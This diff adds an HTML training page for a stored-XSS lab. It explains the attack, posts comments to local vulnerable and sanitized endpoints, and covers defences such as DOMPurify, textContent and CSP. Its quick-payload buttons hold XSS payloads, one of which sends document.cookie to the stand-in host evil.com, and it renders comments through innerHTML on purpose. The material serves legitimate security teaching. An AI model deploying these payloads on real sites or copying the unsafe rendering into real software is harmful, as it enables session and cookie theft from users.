@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Lab 02 — Stored XSS</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}body{background:#0f1117;color:#e2e8f0;font-family:'Segoe UI',system-ui,sans-serif;padding:24px;line-height:1.6}h1{font-size:1.5rem;color:#ef4444;margin-bottom:4px}.sub{color:#94a3b8;font-size:.85rem;margin-bottom:20px}.tabs{display:flex;gap:6px;margin-bottom:16px;flex-wrap:wrap}.tab{padding:7px 14px;border-radius:8px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem}.tab.active{background:#3a1e1e;border-color:#ef4444;color:#ef4444}.panel{display:none}.panel.active{display:block}.card{background:#1e2130;border:1px solid #2d3551;border-radius:12px;padding:20px;margin-bottom:14px}.card h3{color:#ef4444;margin-bottom:10px;font-size:.95rem}.card h3.safe{color:#10b981}pre{background:#0f1117;border:1px solid #2d3551;border-radius:8px;padding:14px;overflow-x:auto;font-size:.78rem;line-height:1.7;white-space:pre-wrap}.kw{color:#60a5fa}.str{color:#10b981}.cm{color:#475569}.fn{color:#a78bfa}.danger{color:#ef4444}input,textarea{width:100%;padding:10px;border-radius:8px;border:1px solid #2d3551;background:#0f1117;color:#e2e8f0;font-family:monospace;font-size:.82rem;margin:6px 0}button{padding:8px 16px;border-radius:6px;border:1px solid #2d3551;background:#1e2130;color:#94a3b8;cursor:pointer;font-size:.82rem;margin:3px}button:hover{border-color:#ef4444;color:#ef4444}button.red{background:#3a1e1e;border-color:#ef4444;color:#ef4444}button.green{background:#1a3a2a;border-color:#10b981;color:#10b981}.grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}.output{background:#0d1117;border:1px solid #2d3551;border-radius:8px;padding:12px;font-family:monospace;font-size:.78rem;min-height:80px;max-height:300px;overflow:auto;white-space:pre-wrap;margin-top:8px}.info{background:#0f1117;border-left:3px solid #60a5fa;padding:12px;border-radius:0 8px 8px 0;font-size:.8rem;color:#94a3b8;margin:8px 0}.warn{border-left-color:#ef4444}
+</style>
+</head>
+<body>
+<h1>🔴 Lab 02 — Stored XSS</h1>
+<p class="sub">Module 12.1 · Web Threats · Payload stored in DB → served to all visitors</p>
+<div class="tabs">
+  <div class="tab active" onclick="setTab(0)">Concept</div>
+  <div class="tab" onclick="setTab(1)">Hands-On Lab</div>
+  <div class="tab" onclick="setTab(2)">Browser Internals</div>
+  <div class="tab" onclick="setTab(3)">Interview Q&A</div>
+</div>
+
+<div class="panel active" id="p0">
+  <div class="card">
+    <h3>What is Stored XSS?</h3>
+    <p style="font-size:.83rem;color:#94a3b8">Stored (Persistent) XSS is the most dangerous XSS type. The attacker's payload is <strong>saved in the server's database</strong> (e.g., comment, profile bio, forum post) and served to <strong>every visitor</strong> who views that content. Unlike reflected XSS, no social engineering is needed — every user who visits the page is attacked.</p>
+    <div style="display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-top:12px;font-size:.78rem">
+      <div style="background:#0f1117;border:1px solid #3a1e1e;border-radius:8px;padding:10px"><div style="color:#ef4444;font-weight:700;margin-bottom:4px">Real-World: TweetDeck (2014)</div><div style="color:#94a3b8">Self-retweeting XSS worm spread across 40K+ accounts in minutes via stored XSS in tweet rendering.</div></div>
+      <div style="background:#0f1117;border:1px solid #3a1e1e;border-radius:8px;padding:10px"><div style="color:#ef4444;font-weight:700;margin-bottom:4px">Real-World: British Airways (2018)</div><div style="color:#94a3b8">Magecart injected stored XSS that stole 380,000 credit card numbers from payment pages.</div></div>
+    </div>
+  </div>
+</div>
+
+<div class="panel" id="p1">
+  <div class="card">
+    <h3>🧪 Post Comments — Vulnerable vs Secure</h3>
+    <div class="grid2">
+      <div>
+        <label style="font-size:.82rem;color:#94a3b8">Username:</label>
+        <input id="username" value="attacker_eve" style="margin-bottom:4px">
+      </div>
+      <div>
+        <label style="font-size:.82rem;color:#94a3b8">Quick payloads:</label>
+        <button onclick="setComment('<img src=x onerror=alert(document.cookie)>')">img onerror</button>
+        <button onclick="setComment('<script>fetch(`http://evil.com?c=${document.cookie}`)</script>')">cookie steal</button>
+        <button onclick="setComment('<div onmouseover=alert(1)>Hover me</div>')">onmouseover</button>
+      </div>
+    </div>
+    <label style="font-size:.82rem;color:#94a3b8">Comment (try XSS payloads):</label>
+    <textarea id="comment" rows="3">&lt;img src=x onerror="alert('Stored XSS!')"&gt; Nice article!</textarea>
+    <div style="margin-top:6px">
+      <button class="red" onclick="postComment('vulnerable')">⚠️ Post to Vulnerable Endpoint</button>
+      <button class="green" onclick="postComment('secure')">✅ Post to Secure Endpoint (DOMPurify)</button>
+    </div>
+  </div>
+
+  <div class="card">
+    <h3>📋 Comments from Server</h3>
+    <button onclick="loadComments()">🔄 Load Comments</button>
+    <button onclick="clearComments()">🗑️ Clear All</button>
+    <span style="font-size:.78rem;color:#94a3b8;margin-left:8px">Rendering mode:</span>
+    <button id="btn-raw" class="red" onclick="setRender('raw')">innerHTML (unsafe)</button>
+    <button id="btn-safe" onclick="setRender('safe')">textContent (safe)</button>
+    <div id="comments-list" style="margin-top:12px"></div>
+  </div>
+
+  <div class="card">
+    <h3>📡 Network Log</h3>
+    <div class="output" id="netlog">Requests will appear here...</div>
+  </div>
+</div>
+
+<div class="panel" id="p2">
+  <div class="card">
+    <h3>🔬 How Stored XSS Executes in the Browser</h3>
+    <div style="font-size:.82rem;color:#94a3b8">
+      <p><strong style="color:#60a5fa">1. Storage:</strong> Server receives POST with malicious HTML. If no sanitization, it's stored raw in the database (SQLite xss_comments table in our lab).</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">2. Retrieval:</strong> When ANY user requests the comments page, server queries DB and includes raw HTML in the response body.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">3. Parsing:</strong> Browser's HTML parser tokenizes the response. Malicious &lt;script&gt; tags are parsed and executed during DOM construction. Event handlers (onerror, onload) are scheduled.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">4. Client-Side Rendering (SPA):</strong> In React/Angular apps, if you set innerHTML or use dangerouslySetInnerHTML with unsanitized data from API, the same attack works — the browser parses the injected HTML.</p>
+      <p style="margin-top:8px"><strong style="color:#60a5fa">5. Defense layers:</strong><br>
+        ① Sanitize on write (DOMPurify server-side) — strips dangerous tags/attrs before storing<br>
+        ② Sanitize on read (DOMPurify client-side) — defense in depth for legacy data<br>
+        ③ Use textContent/innerText instead of innerHTML when HTML rendering isn't needed<br>
+        ④ CSP nonce to block inline scripts even if they reach the DOM</p>
+    </div>
+  </div>
+</div>
+
+<div class="panel" id="p3">
+  <div class="card">
+    <h3>Google Senior Frontend — Stored XSS Questions</h3>
+    <div style="font-size:.82rem">
+      <p><strong style="color:#60a5fa">Q: You inherit a codebase with stored XSS in user comments. How do you remediate?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Immediate: Add server-side DOMPurify sanitization on the output path (when serving comments). Then: sanitize existing DB data with a migration script. Then: add input sanitization on write. Deploy CSP with nonces as a safety net. Long term: migrate to a framework with auto-escaping (React) and use textContent for non-HTML fields.</p>
+      <p><strong style="color:#60a5fa">Q: Should you sanitize on input or output?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">Both, but output sanitization is more important. Input sanitization can mangle valid data (e.g., a math formula with &lt; symbols). Output encoding is context-aware — you encode differently for HTML body, attributes, JavaScript, and URLs. At Google, the principle is "render safely at the boundary where data meets HTML."</p>
+      <p><strong style="color:#60a5fa">Q: How does Stored XSS interact with CSP?</strong></p>
+      <p style="color:#94a3b8;margin-bottom:12px">CSP with nonce-based script-src blocks stored XSS scripts that don't have the correct nonce. However, CSP doesn't prevent all XSS — event handler attributes (onerror, onload) can bypass some CSP configurations unless you also set 'unsafe-inline' to be blocked. Strict CSP + DOMPurify is the gold standard.</p>
+    </div>
+  </div>
+</div>
+
+<script>
+const API = 'http://localhost:3001';
+let renderMode = 'raw';
+const tabs = document.querySelectorAll('.tab');
+const panels = document.querySelectorAll('.panel');
+function setTab(i){tabs.forEach((t,j)=>{t.classList.toggle('active',j===i);panels[j].classList.toggle('active',j===i)})}
+function setComment(c){document.getElementById('comment').value=c}
+function setRender(m){renderMode=m;document.getElementById('btn-raw').classList.toggle('red',m==='raw');document.getElementById('btn-safe').classList.toggle('green',m==='safe');loadComments()}
+function log(msg){const el=document.getElementById('netlog');el.textContent+='\n'+new Date().toLocaleTimeString()+' '+msg;el.scrollTop=el.scrollHeight}
+
+async function postComment(type){
+  const username=document.getElementById('username').value;
+  const comment=document.getElementById('comment').value;
+  const url=`${API}/api/xss/comments/${type}`;
+  log(`→ POST ${url}`);
+  try{
+    const res=await fetch(url,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({username,comment})});
+    const data=await res.json();
+    log(`← ${res.status} ${JSON.stringify(data)}`);
+    loadComments();
+  }catch(e){log(`✗ ${e.message}`)}
+}
+
+async function loadComments(){
+  log(`→ GET ${API}/api/xss/comments`);
+  try{
+    const res=await fetch(`${API}/api/xss/comments`);
+    const data=await res.json();
+    log(`← ${data.comments.length} comments loaded`);
+    const list=document.getElementById('comments-list');
+    list.innerHTML='';
+    data.comments.forEach(c=>{
+      const div=document.createElement('div');
+      div.style.cssText='background:#0f1117;border:1px solid #2d3551;border-radius:8px;padding:10px;margin-bottom:6px;font-size:.82rem';
+      const header=document.createElement('div');
+      header.style.cssText='color:#60a5fa;font-weight:bold;margin-bottom:4px';
+      header.textContent=`${c.username} · ${c.created_at}`;
+      div.appendChild(header);
+      const body=document.createElement('div');
+      if(renderMode==='raw'){
+        body.innerHTML=c.comment; // DANGEROUS: executes scripts
+      }else{
+        body.textContent=c.comment; // SAFE: shows raw text
+      }
+      div.appendChild(body);
+      list.appendChild(div);
+    });
+  }catch(e){log(`✗ ${e.message}`)}
+}
+
+async function clearComments(){
+  await fetch(`${API}/api/xss/comments/clear`,{method:'POST'});log('Comments cleared');loadComments();
+}
+</script>
+</body></html>
